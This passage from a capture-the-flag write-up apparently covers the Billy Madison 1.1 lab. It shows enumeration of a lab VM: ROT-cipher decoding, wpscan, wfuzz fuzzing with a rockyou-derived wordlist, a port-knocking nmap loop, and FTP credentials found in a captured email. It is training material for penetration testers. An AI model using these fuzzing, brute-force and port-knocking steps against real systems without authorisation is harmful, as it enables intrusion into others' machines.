</span><span class='line'>getting file <span class="se">\e</span>bd.txt of size <span class="m">35</span> as ebd.txt <span class="o">(</span>1.2 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 1.2 KiloBytes/sec<span class="o">)</span>
</span><span class='line'>smb: &gt; <span class="nb">exit</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Download the file <code>ebd.txt</code> and read it:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# cat ebd.txt
</span><span class='line'>Erics backdoor is currently CLOSED
</span></code></pre></td></tr></table></div></figure></p>

<p>Ok, looks like I need to find a way to active the backdoor.</p>

<p>Now I back to port 23, try to telnet to the target.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# telnet 10.1.1.129 23
</span><span class='line'>Trying 10.1.1.129<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Connected to 10.1.1.129.
</span><span class='line'>Escape character is <span class="p">&amp;</span>lsquo<span class="p">;</span>^<span class="o">]</span><span class="p">&amp;</span>rsquo<span class="p">;</span>.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;&lt;strong&gt;&lt;strong&gt;&lt;em&gt; HAHAH! You<span class="p">&amp;</span>rsquo<span class="p">;</span>re banned <span class="k">for</span> a <span class="k">while</span>, Billy Boy!  By the way, I caught you trying to hack my wifi - but the joke<span class="p">&amp;</span>rsquo<span class="p">;</span>s on you! I don<span class="p">&amp;</span>rsquo<span class="p">;</span>t use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!! &lt;/em&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Connection closed by foreign host.
</span></code></pre></td></tr></table></div></figure></p>

<p>Nothing special found here, but take notes that the target used to use <code>ROT-10</code> cipher with potential key <font color="red"><code>rkfpuzrahngvat</code></font>.</p>

<p>Then I use python script to generate all the ROT strings:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">root</span><span class="nd">@kali</span><span class="p">:</span><span class="o">~/</span><span class="n">myTest</span><span class="o">/</span><span class="n">BillyMadison1</span><span class="o">.</span><span class="mi">1</span><span class="c"># cat rot.py&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="err">!</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">python</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">26</span><span class="p">):</span>
</span><span class='line'>  <span class="k">print</span> <span class="n">translate</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;http://www.dcode.fr/caesar-cipher&quot;</span> <span class="n">title</span><span class="o">=</span><span class="s">&quot;online Caesar cipher&quot;</span><span class="o">&gt;</span><span class="mi">1</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;</span><span class="p">,</span><span class="n">maketrans</span><span class="p">(</span><span class="n">lowercase</span><span class="p">,</span> <span class="n">lowercase</span><span class="p">[</span><span class="n">n</span><span class="p">:]</span><span class="o">+</span><span class="n">lowercase</span><span class="p">[:</span><span class="n">n</span><span class="p">]))</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Alternatively, here is an <a href="http://www.dcode.fr/caesar-cipher" title="online Caesar cipher">online tool</a></p>

<p>And then run the script with parameter <code>rkfpuzrahngvat</code>, and save the result to file <code>rot-rst.txt</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# ./rot.py <span class="p">&amp;</span>ldquo<span class="p">;</span>rkfpuzrahngvat<span class="p">&amp;</span>rdquo<span class="p">;</span> <span class="p">|</span> tee rot-rst.txt
</span><span class='line'>rkfpuzrahngvat
</span><span class='line'>slgqvasbiohwbu
</span><span class='line'>tmhrwbtcjpixcv
</span><span class='line'>unisxcudkqjydw
</span><span class='line'>vojtydvelrkzex
</span><span class='line'>wpkuzewfmslafy
</span><span class='line'>xqlvafxgntmbgz
</span><span class='line'>yrmwbgyhouncha
</span><span class='line'>zsnxchzipvodib
</span><span class='line'>atoydiajqwpejc
</span><span class='line'>bupzejbkrxqfkd
</span><span class='line'>cvqafkclsyrgle
</span><span class='line'>dwrbgldmtzshmf
</span><span class='line'>exschmenuating
</span><span class='line'>fytdinfovbujoh
</span><span class='line'>gzuejogpwcvkpi
</span><span class='line'>havfkphqxdwlqj
</span><span class='line'>ibwglqiryexmrk
</span><span class='line'>jcxhmrjszfynsl
</span><span class='line'>kdyinsktagzotm
</span><span class='line'>lezjotlubhapun
</span><span class='line'>mfakpumvcibqvo
</span><span class='line'>ngblqvnwdjcrwp
</span><span class='line'>ohcmrwoxekdsxq
</span><span class='line'>pidnsxpyfletyr
</span><span class='line'>qjeotyqzgmfuzs
</span></code></pre></td></tr></table></div></figure></p>

<p>Then I noticed that a WordPress site is running on port 69, so I use <code>wpscan</code> to do a quick scan.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# wpscan -u &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/&quot;</span>&gt;http://10.1.1.129:69/&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    __          _______   _____
</span><span class='line'>    <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
</span><span class='line'>     <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ ®
</span><span class='line'>      <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\ </span>
</span><span class='line'>       <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
</span><span class='line'>        <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>
</span><span class='line'>
</span><span class='line'>    WordPress Security Scanner by the WPScan Team
</span><span class='line'>                   Version 2.9.2
</span><span class='line'>      Sponsored by Sucuri - https://sucuri.net
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;   @&lt;em&gt;WPScan&lt;/em&gt;, @ethicalhack3r, @erwan_lr, pvdl, @&lt;em&gt;FireFart&lt;/em&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;The plugins directory <span class="p">&amp;</span>lsquo<span class="p">;</span>wp-content/plugins<span class="p">&amp;</span>rsquo<span class="p">;</span> does not exist.
</span><span class='line'>You can specify one per <span class="nb">command </span>line option <span class="o">(</span>don<span class="p">&amp;</span>rsquo<span class="p">;</span>t forget to include the wp-content directory <span class="k">if</span> needed<span class="o">)</span>
</span><span class='line'><span class="o">[</span>?<span class="o">]</span> Continue? <span class="o">[</span>Y<span class="o">]</span>es <span class="o">[</span>N<span class="o">]</span>o, default: <span class="o">[</span>N<span class="o">]</span>
</span><span class='line'>Y
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/&quot;</span>&gt;http://10.1.1.129:69/&lt;/a&gt;
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Started: Mon Dec <span class="m">12</span> 06:46:45 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> The WordPress <span class="p">&amp;</span>lsquo<span class="p">;</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/readme.html&quot;</span>&gt;http://10.1.1.129:69/readme.html&lt;/a&gt;<span class="p">&amp;</span>rsquo<span class="p">;</span> file exists exposing a version number
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Interesting header: SERVER: MadisonHotelsWordpress
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> XML-RPC Interface available under: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/xmlrpc.php&quot;</span>&gt;http://10.1.1.129:69/xmlrpc.php&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> WordPress version 1.0 <span class="o">(</span>Released on 2004-01-03<span class="o">)</span> identified from meta generator, readme&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> WordPress theme in use: twentyeleven&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Name: twentyeleven
</span><span class='line'> <span class="p">|</span>  Latest version: 2.5
</span><span class='line'> <span class="p">|</span>  Location: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/wp-content/themes/twentyeleven/&quot;</span>&gt;http://10.1.1.129:69/wp-content/themes/twentyeleven/&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Readme: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/wp-content/themes/twentyeleven/readme.txt&quot;</span>&gt;http://10.1.1.129:69/wp-content/themes/twentyeleven/readme.txt&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Changelog: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/wp-content/themes/twentyeleven/changelog.txt&quot;</span>&gt;http://10.1.1.129:69/wp-content/themes/twentyeleven/changelog.txt&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Style URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/wp-content/themes/twentyeleven/style.css&quot;</span>&gt;http://10.1.1.129:69/wp-content/themes/twentyeleven/style.css&lt;/a&gt;
</span><span class='line'> <span class="p">|</span>  Referenced style.css: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129:69/static/wp-content/themes/twentyeleven/style.css&quot;</span>&gt;http://10.1.1.129:69/static/wp-content/themes/twentyeleven/style.css&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Enumerating plugins from passive detection <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> No plugins found&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>+<span class="o">]</span> Finished: Mon Dec <span class="m">12</span> 06:46:45 2016
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Requests Done: 66
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Memory used: 15.719 MB
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Elapsed <span class="nb">time</span>: 00:00:00
</span></code></pre></td></tr></table></div></figure></p>

<p>Nothing found. :`(</p>

<p>So I moving to port 80 and there is no clue found on the home page but 3 pics, nothing found in the source code as well.</p>

<p>Then I donwloaded the three images and using <code>exiftool</code> to check if anything hidden in them, but no luck.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# wfuzz -c <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">hc</span><span class="o">=</span><span class="m">404</span> -z file,/root/myTest/BillyMadison1.1/rot-rst.txt &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129/FUZZ&quot;</span>&gt;http://10.1.1.129/FUZZ&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Wfuzz 2.1.3 - The Web Bruteforcer                      *&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Target: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129/FUZZ&quot;</span>&gt;http://10.1.1.129/FUZZ&lt;/a&gt;
</span><span class='line'>Total requests: 26&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ID  Response   Lines      Word         Chars          Request    &lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;00008:  <span class="nv">C</span><span class="o">=</span><span class="m">301</span>      <span class="m">9</span> L        <span class="m">28</span> W      <span class="m">317</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span>exschmenuating<span class="p">&amp;</span>rdquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Total <span class="nb">time</span>: 1.990103
</span><span class='line'>Processed Requests: 26
</span><span class='line'>Filtered Requests: 25
</span><span class='line'>Requests/sec.: 13.06464
</span></code></pre></td></tr></table></div></figure></p>

<p>Great, found one interesting string <font color="red"><code>exschmenuating</code></font>.</p>

<p><img class="left" src="/downloads/BillyMadison1.1/1.png"></p>

<p>From this page, firstly, I got clues that <code>veronica</code> would be a part of the password, so I filtered out all the word which including <code>veronica</code> from the famous wordlist file <code>rockyou.txt</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# grep <span class="p">&amp;</span>lsquo<span class="p">;</span>veronica<span class="p">&amp;</span>rsquo<span class="p">;</span> /usr/share/wordlists/rockyou.txt &gt; pass.lst
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1# cat pass.lst <span class="p">|</span> wc -l
</span><span class='line'>773
</span></code></pre></td></tr></table></div></figure></p>

<p>Also, there should be a &lsquo;.captured&rsquo; file (which mostly is ended by .cap) in the folder and <code>veronica</code> is part of the file name. So I run <code>wfuzz</code> again to search the captured file.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# wfuzz -c <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">hc</span><span class="o">=</span><span class="m">404</span> -z file,/root/myTest/BillyMadison1.1/pass.lst &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129/exschmenuating/FUZZ.cap&quot;</span>&gt;http://10.1.1.129/exschmenuating/FUZZ.cap&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;ul&gt;
</span><span class='line'>&lt;li&gt;Wfuzz 2.1.3 - The Web Bruteforcer                      *&lt;/li&gt;
</span><span class='line'>&lt;/ul&gt;
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Target: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.129/exschmenuating/FUZZ.cap&quot;</span>&gt;http://10.1.1.129/exschmenuating/FUZZ.cap&lt;/a&gt;
</span><span class='line'>Total requests: 773&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;hr /&gt;
</span><span class='line'>
</span><span class='line'>&lt;h1&gt;ID  Response   Lines      Word         Chars          Request    &lt;/h1&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;00522:  <span class="nv">C</span><span class="o">=</span><span class="m">400</span>     <span class="m">10</span> L        <span class="m">35</span> W      <span class="m">302</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span>veronica<span class="nv">$%</span><span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>00716:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>    <span class="m">192</span> L       <span class="m">722</span> W     <span class="m">8700</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span>012987veronica<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>00726:  <span class="nv">C</span><span class="o">=</span><span class="m">200</span>     <span class="m">24</span> L       <span class="m">162</span> W     <span class="m">1080</span> Ch    <span class="p">&amp;</span>ldquo<span class="p">;</span><span class="c">#0104veronica&amp;rdquo;&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Total <span class="nb">time</span>: 1.617280
</span><span class='line'>Processed Requests: 773
</span><span class='line'>Filtered Requests: 770
</span><span class='line'>Requests/sec.: 477.9627
</span></code></pre></td></tr></table></div></figure></p>

<p>Then donwloaded the captured file <code>http://10.1.1.129/exschmenuating/012987veronica.cap</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>RE: VIRUS ALERT!
</span><span class='line'>Eric,
</span><span class='line'>Thanks <span class="k">for</span> your message. I tried to download that file but my antivirus blocked it.
</span><span class='line'>Could you just upload it directly to us via FTP?  We keep FTP turned off unless someone connects with the <span class="p">&amp;</span>ldquo<span class="p">;</span>Spanish Armada<span class="p">&amp;</span>rdquo<span class="p">;</span> combo.
</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://www.youtube.com/watch?v=z5YU7JwVy7s&quot;</span>&gt;https://www.youtube.com/watch?v<span class="o">=</span>z5YU7JwVy7s&lt;/a&gt;
</span><span class='line'>QUIT
</span></code></pre></td></tr></table></div></figure></p>

<p>Here I know that the FTP is turned off by default, and need port knocking to activate it. By checking the Youtube video, I got the port knock sequence: <code>1466, 67, 1469 ,1514, 1981, 1986, 1588</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="k">for</span> x in <span class="m">1466</span> <span class="m">67</span> <span class="m">1469</span> <span class="m">1514</span> <span class="m">1981</span> 1986<span class="p">;</span> <span class="k">do</span> nmap -Pn <span class="p">&amp;</span>ndash<span class="p">;</span>host_timeout <span class="m">201</span> <span class="p">&amp;</span>ndash<span class="p">;</span>max-retries <span class="m">0</span> -p <span class="nv">$x</span> 10.1.1.129<span class="p">;</span> <span class="k">done</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After knocking the ports, I use <code>nmap</code> to check if the FTP open:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# nmap -p21 -v 10.1.1.129&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting Nmap 7.31 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2016-12-13 06:38 EST
</span><span class='line'>Initiating ARP Ping Scan at 06:38
</span><span class='line'>Scanning 10.1.1.129 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>
</span><span class='line'>Completed ARP Ping Scan at 06:38, 0.03s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
</span><span class='line'>Initiating Parallel DNS resolution of <span class="m">1</span> host. at 06:38
</span><span class='line'>Completed Parallel DNS resolution of <span class="m">1</span> host. at 06:38, 0.00s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 06:38
</span><span class='line'>Scanning 10.1.1.129 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>
</span><span class='line'>Discovered open port 21/tcp on 10.1.1.129
</span><span class='line'>Completed SYN Stealth Scan at 06:38, 0.05s elapsed <span class="o">(</span><span class="m">1</span> total ports<span class="o">)</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.129
</span><span class='line'>Host is up <span class="o">(</span>0.00040s latency<span class="o">)</span>.
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>21/tcp open  ftp
</span><span class='line'>MAC Address: 00:0C:29:84:DA:45 <span class="o">(</span>VMware<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Read data files from: /usr/bin/../share/nmap
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.24 seconds
</span><span class='line'>           Raw packets sent: <span class="m">2</span> <span class="o">(</span>72B<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">2</span> <span class="o">(</span>72B<span class="o">)</span>
</span><span class='line'>root@kali:~/myTest/BillyMadison1.1#
</span></code></pre></td></tr></table></div></figure></p>

<p>Great, now the port 21 is open.</p>

<p>From the next email, I found the FTP login information:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Eric,
</span><span class='line'>Thanks <span class="k">for</span> your message. I tried to download that file but my antivirus blocked it.
</span><span class='line'>Could you just upload it directly to us via FTP?  We keep FTP turned off unless someone connects with the <span class="p">&amp;</span>ldquo<span class="p">;</span>Spanish Armada<span class="p">&amp;</span>rdquo<span class="p">;</span> combo.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Veronica,
</span><span class='line'>Thanks that will be perfect.  Please <span class="nb">set </span>me up an account with username of <span class="p">&amp;</span>ldquo<span class="p">;</span>eric<span class="p">&amp;</span>rdquo<span class="p">;</span> and password <span class="p">&amp;</span>ldquo<span class="p">;</span>ericdoesntdrinkhisownpee.<span class="p">&amp;</span>rdquo<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Take a note here, the eric&rsquo;s FTP login <font color="red"><code>eric/ericdoesntdrinkhisownpee</code></font></p>

<p>Now I login to the FTP as <code>eric</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myTest/BillyMadison1.1# ftp 10.1.1.129
</span><span class='line'>Connected to 10.1.1.129.
</span><span class='line'><span class="m">220</span> Welcome to ColoradoFTP - the open <span class="nb">source </span>FTP server <span class="o">(</span>www.coldcore.com<span class="o">)</span>
</span><span class='line'>Name <span class="o">(</span>10.1.1.129:root<span class="o">)</span>: eric
